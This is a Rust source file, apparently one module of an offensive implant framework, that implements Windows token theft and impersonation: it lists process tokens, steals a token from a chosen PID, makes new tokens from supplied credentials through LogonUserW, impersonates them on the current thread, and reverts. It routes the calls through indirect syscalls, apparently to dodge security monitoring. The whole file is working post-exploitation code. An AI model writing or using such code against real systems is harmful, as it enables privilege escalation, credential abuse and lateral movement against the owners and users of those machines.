//! Token vault cloud module — steal / make / impersonate / revert / list.
//!
//! ABI (shared with `libra-load`): `module_main(input, input_len, output, cap)`.
//! All token operations go through `libra-syscalls` indirect syscalls.

#![allow(non_snake_case)]

use serde_json::Value;
use std::sync::Mutex;

use libra_syscalls::types::{ClientId, Handle, ObjectAttributes};

// ── 常量 ───────────────────────────────────────────────────────────────

const SYSTEM_HANDLE_INFORMATION: u32 = 16;
const TOKEN_USER: u32 = 1;
const TOKEN_TYPE: u32 = 8;
const TOKEN_PRIMARY: u32 = 1;
const TOKEN_IMPERSONATION: u32 = 2;
const THREAD_IMPERSONATION_TOKEN: u32 = 5;

const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
const PROCESS_DUP_HANDLE: u32 = 0x0040;
const TOKEN_QUERY: u32 = 0x0008;
const TOKEN_DUPLICATE: u32 = 0x0002;
const TOKEN_IMPERSONATE: u32 = 0x0004;
const SECURITY_IMPERSONATION: u32 = 2;

const LOGON32_LOGON_NEW_CREDENTIALS: u32 = 9;
const LOGON32_PROVIDER_WINNT50: u32 = 3;

/// `NtCurrentThread()` / `NtCurrentProcess()` 伪句柄。
const CURRENT_THREAD: Handle = usize::MAX - 1;

// ── advapi32 FFI ───────────────────────────────────────────────────────

#[link(name = "advapi32")]
extern "system" {
    fn LogonUserW(
        username: *const u16,
        domain: *const u16,
        password: *const u16,
        logon_type: u32,
        logon_provider: u32,
        token: *mut usize,
    ) -> i32;
    fn ConvertSidToStringSidW(sid: *const u8, string: *mut *mut u16) -> i32;
}

#[link(name = "kernel32")]
extern "system" {
    fn LocalFree(mem: *mut core::ffi::c_void) -> usize;
}

// ── 结构 ───────────────────────────────────────────────────────────────

#[repr(C)]
struct SystemHandleEntry {
    unique_process_id: u16,
    creator_back_trace_index: u16,
    object_type_index: u8,
    handle_attributes: u8,
    handle_value: u16,
    object: usize,
    granted_access: u32,
}

#[repr(C)]
struct SecurityQos {
    length: u32,
    impersonation_level: u32,
    context_tracking_mode: u8,
    effective_only: u8,
}

/// 偷到的 token 的 vault 条目。
#[allow(dead_code)]
struct VaultToken {
    id: u32,
    pid: u32,
    username: String,
    handle: Handle,
}

static VAULT: Mutex<Vec<VaultToken>> = Mutex::new(Vec::new());
static NEXT_ID: Mutex<u32> = Mutex::new(1);

// ── module ABI ─────────────────────────────────────────────────────────

#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("token", "\0").as_ptr() as *const u8
}

#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };

    let result = dispatch(&input_json);
    let bytes = result.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n);
    }
    n
}

fn dispatch(input: &str) -> String {
    let v: Value = serde_json::from_str(input).unwrap_or(Value::Object(Default::default()));
    let op = v.get("op").and_then(|o| o.as_str()).unwrap_or("");

    match op {
        "list" => list(),
        "steal" => {
            let pid = v.get("pid").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
            steal(pid)
        }
        "make" => {
            let user = v.get("username").and_then(|s| s.as_str()).unwrap_or("");
            let pass = v.get("password").and_then(|s| s.as_str()).unwrap_or("");
            let domain = v.get("domain").and_then(|s| s.as_str()).unwrap_or(".");
            make(user, domain, pass)
        }
        "impersonate" => {
            let id = v.get("id").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
            let pid = v.get("pid").and_then(|p| p.as_u64()).unwrap_or(0) as u32;
            impersonate(id, pid)
        }
        "revert" => revert(),
        _ => r#"{"error":"unknown token op"}"#.to_string(),
    }
}

// ── 辅助 ───────────────────────────────────────────────────────────────

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// 枚举系统句柄表里的所有唯一 PID。
fn enum_pids() -> Vec<u32> {
    unsafe {
        // 句柄表大小不定，按 ReturnLength 动态扩容重试。
        let mut size = 4 * 1024 * 1024usize;
        let buf = loop {
            let mut buf = vec![0u8; size];
            let mut ret = 0u32;
            let s = libra_syscalls::nt_query_system_information(
                SYSTEM_HANDLE_INFORMATION, buf.as_mut_ptr() as usize, size as u32, &mut ret,
            );
            if s == 0 {
                break buf;
            }
            if s as u32 == 0xc000_0004 && (ret as usize) > size {
                size = ret as usize + 0x1000;
                continue;
            }
            return Vec::new();
        };

        let count = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;
        // x64: NumberOfHandles(u32) 后对齐到 8，entries 从 offset 8 开始。
        let entries = buf.as_ptr().add(8) as *const SystemHandleEntry;
        let mut pids = Vec::new();
        for i in 0..count {
            let e = &*entries.add(i);
            let pid = e.unique_process_id as u32;
            if pid != 0 && pid != 4 && !pids.contains(&pid) {
                pids.push(pid);
            }
        }
        pids
    }
}

/// 打开进程的主 token。
unsafe fn open_process_token(pid: u32) -> Option<Handle> {
    let client = ClientId::for_process(pid);
    let oa = ObjectAttributes::empty();
    let mut process = 0usize;
    if libra_syscalls::nt_open_process(
        &mut process,
        PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
        &oa as *const ObjectAttributes as usize,
        &client as *const ClientId as usize,
    ) != 0 {
        return None;
    }

    let mut token = 0usize;
    let s = libra_syscalls::nt_open_process_token(
        process,
        TOKEN_QUERY | TOKEN_DUPLICATE,
        &mut token,
    );
    libra_syscalls::nt_close(process);
    if s != 0 {
        return None;
    }
    Some(token)
}

/// 查询 token 所属用户，返回 `DOMAIN\user` 或 SID 字符串。
unsafe fn token_username(token: Handle) -> String {
    // TOKEN_USER 结构：{ SID_AND_ATTRIBUTES { SID*, Attributes } }
    let mut buf = [0u8; 256];
    let mut ret = 0u32;
    let s = libra_syscalls::nt_query_information_token(
        token, TOKEN_USER, buf.as_mut_ptr() as usize, buf.len() as u32, &mut ret,
    );
    if s != 0 {
        return "(unknown)".to_string();
    }

    // buf[0..8] = SID 指针（小端）
    let sid_ptr = usize::from_le_bytes(buf[0..8].try_into().unwrap()) as *const u8;
    if sid_ptr.is_null() {
        return "(no sid)".to_string();
    }

    let mut sid_str: *mut u16 = std::ptr::null_mut();
    if ConvertSidToStringSidW(sid_ptr, &mut sid_str) != 0 && !sid_str.is_null() {
        let mut len = 0usize;
        while *sid_str.add(len) != 0 {
            len += 1;
        }
        let s = String::from_utf16_lossy(std::slice::from_raw_parts(sid_str, len));
        LocalFree(sid_str as *mut core::ffi::c_void);
        return s;
    }

    "(no sid)".to_string()
}

// ── op 实现 ────────────────────────────────────────────────────────────

fn list() -> String {
    let pids = enum_pids();
    let mut out = Vec::new();
    for pid in pids {
        if let Some(token) = unsafe { open_process_token(pid) } {
            let username = unsafe { token_username(token) };
            out.push(serde_json::json!({
                "pid": pid,
                "username": username,
            }));
            unsafe { libra_syscalls::nt_close(token) };
        }
    }
    serde_json::json!({ "success": true, "tokens": out }).to_string()
}

fn steal(pid: u32) -> String {
    if pid == 0 {
        return r#"{"success":false,"error":"pid required"}"#.to_string();
    }
    let token = match unsafe { open_process_token(pid) } {
        Some(t) => t,
        None => return r#"{"success":false,"error":"failed to open process token"}"#.to_string(),
    };
    let username = unsafe { token_username(token) };

    let mut vault = VAULT.lock().unwrap();
    let mut next = NEXT_ID.lock().unwrap();
    let id = *next;
    *next += 1;
    vault.push(VaultToken { id, pid, username: username.clone(), handle: token });

    serde_json::json!({
        "success": true,
        "token": { "id": id, "pid": pid, "username": username }
    })
    .to_string()
}

fn make(username: &str, domain: &str, password: &str) -> String {
    unsafe {
        let user_w = wide(username);
        let dom_w = wide(domain);
        let pass_w = wide(password);
        let mut token = 0usize;
        let ok = LogonUserW(
            user_w.as_ptr(),
            dom_w.as_ptr(),
            pass_w.as_ptr(),
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_WINNT50,
            &mut token,
        );
        if ok == 0 || token == 0 {
            return r#"{"success":false,"error":"LogonUserW failed"}"#.to_string();
        }

        let mut vault = VAULT.lock().unwrap();
        let mut next = NEXT_ID.lock().unwrap();
        let id = *next;
        *next += 1;
        vault.push(VaultToken {
            id,
            pid: 0,
            username: format!("{}\\{}", domain, username),
            handle: token,
        });

        serde_json::json!({
            "success": true,
            "token": { "id": id, "pid": 0, "username": format!("{}\\{}", domain, username) }
        })
        .to_string()
    }
}

fn impersonate(id: u32, pid: u32) -> String {
    // 优先按 id 从 vault 选；否则按 pid 现偷。
    let (handle, _username) = {
        let vault = VAULT.lock().unwrap();
        if let Some(t) = vault.iter().find(|t| id != 0 && t.id == id) {
            (t.handle, t.username.clone())
        } else {
            drop(vault);
            if pid == 0 {
                return r#"{"success":false,"error":"id or pid required"}"#.to_string();
            }
            match unsafe { open_process_token(pid) } {
                Some(h) => (h, format!("pid-{}", pid)),
                None => return r#"{"success":false,"error":"failed to open token"}"#.to_string(),
            }
        }
    };

    let ok = unsafe { impersonate_token(handle) };
    serde_json::json!({ "success": ok, "username": _username }).to_string()
}

/// 模拟一个 token 到当前线程（ReactOS SysImpersonateLoggedOnUser 的简化移植）。
unsafe fn impersonate_token(token: Handle) -> bool {
    // 判断 token 类型
    let mut ty = 0u32;
    let mut ret = 0u32;
    let s = libra_syscalls::nt_query_information_token(
        token, TOKEN_TYPE, &mut ty as *mut u32 as usize, 4, &mut ret,
    );
    if s != 0 {
        return false;
    }

    let mut new_token = token;
    let mut duplicated = false;

    if ty == TOKEN_PRIMARY {
        let qos = SecurityQos {
            length: std::mem::size_of::<SecurityQos>() as u32,
            impersonation_level: SECURITY_IMPERSONATION,
            context_tracking_mode: 1, // SECURITY_DYNAMIC_TRACKING
            effective_only: 0,
        };
        let mut oa = ObjectAttributes::empty();
        oa.security_quality_of_service = &qos as *const SecurityQos as usize;

        let s = libra_syscalls::nt_duplicate_token(
            token,
            TOKEN_IMPERSONATE | TOKEN_QUERY,
            &oa as *const ObjectAttributes as usize,
            0,
            TOKEN_IMPERSONATION,
            &mut new_token,
        );
        if s != 0 {
            return false;
        }
        duplicated = true;
    }

    let s = libra_syscalls::nt_set_information_thread(
        CURRENT_THREAD,
        THREAD_IMPERSONATION_TOKEN,
        &mut new_token as *mut usize as usize,
        std::mem::size_of::<usize>(),
    );

    if duplicated {
        libra_syscalls::nt_close(new_token);
    }

    s == 0
}

fn revert() -> String {
    unsafe {
        let null: usize = 0;
        let s = libra_syscalls::nt_set_information_thread(
            CURRENT_THREAD,
            THREAD_IMPERSONATION_TOKEN,
            &null as *const usize as usize,
            std::mem::size_of::<usize>(),
        );
        serde_json::json!({ "success": s == 0 }).to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn list_enumerates_tokens() {
        libra_syscalls::init().expect("init libra-syscalls");
        let result = list();
        let v: Value = serde_json::from_str(&result).unwrap();
        assert_eq!(v["success"], true);
        assert!(v["tokens"].as_array().map(|a| !a.is_empty()).unwrap_or(false));
    }

    #[test]
    fn revert_succeeds() {
        libra_syscalls::init().expect("init libra-syscalls");
        let result = revert();
        let v: Value = serde_json::from_str(&result).unwrap();
        assert_eq!(v["success"], true);
    }
}
